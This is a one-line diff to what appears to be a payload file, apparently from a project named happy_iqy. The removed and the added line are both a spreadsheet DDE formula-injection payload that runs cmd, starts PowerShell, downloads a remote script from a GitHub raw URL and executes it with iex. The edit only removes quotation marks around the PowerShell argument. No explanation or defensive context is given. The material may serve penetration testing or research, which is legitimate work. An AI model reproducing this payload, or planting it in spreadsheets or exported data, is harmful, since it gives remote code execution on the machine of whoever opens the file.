@@ -1,1 +1,1 @@
-=cmd|' /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/examples/pcinfo.ps1'))"'!notthissheet
+=cmd|' /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/examples/pcinfo.ps1'))'!notthissheet
